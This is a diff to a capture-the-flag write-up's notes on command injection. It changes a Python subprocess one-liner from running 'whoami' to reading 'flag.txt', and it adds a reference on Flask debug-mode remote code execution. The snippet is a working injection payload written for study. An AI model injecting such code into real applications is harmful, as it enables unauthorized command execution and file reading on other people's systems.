@@ -44,11 +44,12 @@ through the `popen` method.
 **NTS:**
 * alternate method of command injection using `subprocess` library (link below):
 ```python
-import subprocess;out = subprocess.Popen(['whoami'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);stdout,stderr = out.communicate();print(stdout);
+import subprocess;out = subprocess.Popen(['cat', 'flag.txt'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);stdout,stderr = out.communicate();print(stdout);
 ```
 
 #### References:
 * https://www.tutorialspoint.com/python/os_popen.htm
+* http://ghostlulz.com/flask-rce-debug-mode/
 * [writeup using `subprocess` library](https://github.com/W3rni0/HacktivityCon_CTF_2020/blob/master/readme.md)
 
 
